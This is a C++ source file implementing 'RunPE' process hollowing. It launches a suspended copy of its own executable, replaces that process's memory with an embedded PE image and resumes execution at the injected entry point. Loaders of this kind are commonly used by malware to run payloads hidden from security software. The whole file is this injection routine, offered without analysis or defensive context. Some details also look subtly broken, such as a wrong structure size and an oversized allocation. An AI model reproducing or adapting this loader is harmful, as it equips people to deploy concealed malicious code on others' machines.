/*
 * main.cc
 *
 *  Created on: May 20, 2018
 *      Author: rujas
 *
 *      run portable executable from memory buffer;
 */
#include "mem.hh"
#include <iostream>

using namespace std;

INT WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR CmdLine, INT ShowConsole)
{
	BOOLEAN Res = RunPe(rawData);
	printf("%d\n", (INT)Res);

	return EXIT_SUCCESS;
}

BOOLEAN __stdcall RunPe(LPVOID lpImage)
{
	if(!lpImage)
		return FALSE;

	IMAGE_DOS_HEADER *localDOSHeader = nullptr;
	IMAGE_NT_HEADERS *localNtHeaders = nullptr;
	IMAGE_OPTIONAL_HEADER *localOptHeader = nullptr;

	DWORD localImageBase;
	DWORD localSizeOfImage;
	LPSTR localszProc = nullptr;

	IMAGE_DOS_HEADER *DOSHeader = nullptr;
	IMAGE_NT_HEADERS *NtHeaders = nullptr;
	IMAGE_OPTIONAL_HEADER *OptHeader = nullptr;
	IMAGE_FILE_HEADER *FileHeader = nullptr;

	DWORD ImageBase;
	DWORD SizeOfImage;
	DWORD Jump;
	DWORD OldProtect;
	//DWORD ImageFirstSection;

	IMAGE_SECTION_HEADER *Sections = new IMAGE_SECTION_HEADER[1024];
	LPVOID ImageMemory;
	LPVOID ImageMemoryDummy;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CONTEXT Context;

	HANDLE localProcess = GetModuleHandleA(nullptr);
	if(!localProcess)
		return FALSE;

	localDOSHeader = reinterpret_cast<IMAGE_DOS_HEADER *>(localProcess);
	if(localDOSHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	localNtHeaders = reinterpret_cast<IMAGE_NT_HEADERS *>(reinterpret_cast<BYTE *>(localProcess) + localDOSHeader->e_lfanew);
	if(localNtHeaders->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	localOptHeader = &localNtHeaders->OptionalHeader;

	localImageBase = localOptHeader->ImageBase;
	localSizeOfImage = localOptHeader->SizeOfImage;

	DOSHeader = reinterpret_cast<IMAGE_DOS_HEADER *>(lpImage);
	if(DOSHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	NtHeaders = reinterpret_cast<IMAGE_NT_HEADERS *>(reinterpret_cast<BYTE *>(lpImage) + DOSHeader->e_lfanew);
	if(NtHeaders->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	OptHeader = &NtHeaders->OptionalHeader;
	FileHeader = &NtHeaders->FileHeader;

	ImageBase = OptHeader->ImageBase;
	SizeOfImage = OptHeader->SizeOfImage;

	ImageMemory = new LPVOID[SizeOfImage];
	ZeroMemory(ImageMemory, SizeOfImage);
	ImageMemoryDummy = ImageMemory;

	Jump = 0;
	memcpy(ImageMemoryDummy, lpImage, OptHeader->SizeOfHeaders);
	if(OptHeader->SizeOfHeaders % OptHeader->SectionAlignment == 0)
		Jump = OptHeader->SizeOfHeaders;
	else
	{
		Jump = OptHeader->SizeOfHeaders / OptHeader->SectionAlignment;
		Jump ++;
		Jump *= OptHeader->SectionAlignment;
	}

	ImageMemoryDummy = reinterpret_cast<LPVOID>(reinterpret_cast<LPBYTE>(ImageMemoryDummy) + Jump);

	//ImageFirstSection = reinterpret_cast<DWORD>(lpImage) + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS);
	memcpy(Sections, reinterpret_cast<LPVOID>(reinterpret_cast<LPBYTE>(lpImage) + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)), FileHeader->NumberOfSections * sizeof(IMAGE_SECTION_HEADER));

	for(WORD i = 0; i < FileHeader->NumberOfSections; ++i)
	{
		Jump = 0;
		memcpy(ImageMemoryDummy, reinterpret_cast<LPVOID>(reinterpret_cast<LPBYTE>(lpImage) + Sections[i].PointerToRawData), Sections[i].SizeOfRawData);
		if(Sections[i].Misc.VirtualSize % OptHeader->SectionAlignment == 0)
			Jump = Sections[i].Misc.VirtualSize;
		else
		{
			Jump = Sections[i].Misc.VirtualSize / OptHeader->SectionAlignment;
			Jump ++;
			Jump *= OptHeader->SectionAlignment;
		}

		ImageMemoryDummy = reinterpret_cast<LPVOID>(reinterpret_cast<LPBYTE>(ImageMemoryDummy) + Jump);
	}

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&Context, sizeof(CONTEXT));

	si.cb = sizeof(PROCESS_INFORMATION);

	localszProc = new CHAR [MAX_PATH];
	GetModuleFileNameA(nullptr, localszProc, MAX_PATH);

	if(CreateProcessA(nullptr, localszProc, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
	{
		Context.ContextFlags = CONTEXT_FULL;
		if(!GetThreadContext(pi.hThread, &Context))
			return FALSE;

		if(localImageBase == ImageBase && localSizeOfImage >= SizeOfImage)
			VirtualProtectEx(pi.hProcess, reinterpret_cast<LPVOID>(ImageBase), SizeOfImage, PAGE_EXECUTE_READWRITE, &OldProtect);
		else if(!NtUnmapViewOfSection(pi.hProcess, reinterpret_cast<LPVOID>(localImageBase)))
			VirtualAllocEx(pi.hProcess, reinterpret_cast<LPVOID>(ImageBase), SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		else return FALSE;

		if(!WriteProcessMemory(pi.hProcess, reinterpret_cast<LPVOID>(ImageBase), ImageMemory, SizeOfImage, nullptr))
			return FALSE;

		//if(!WriteProcessMemory(pi.hProcess, reinterpret_cast<LPVOID>(Context.Rbx + 16), &ImageBase, 4, nullptr))
			//return FALSE;

		Context.Rax = ImageBase + OptHeader->AddressOfEntryPoint;
		if(!SetThreadContext(pi.hThread, &Context))
			return FALSE;

		if(localImageBase == ImageBase && localSizeOfImage >= SizeOfImage)
			VirtualProtectEx(pi.hProcess, reinterpret_cast<LPVOID>(ImageBase), SizeOfImage, OldProtect, nullptr);

		ResumeThread(pi.hThread);
	}
	else
		return FALSE;

	return TRUE;
}

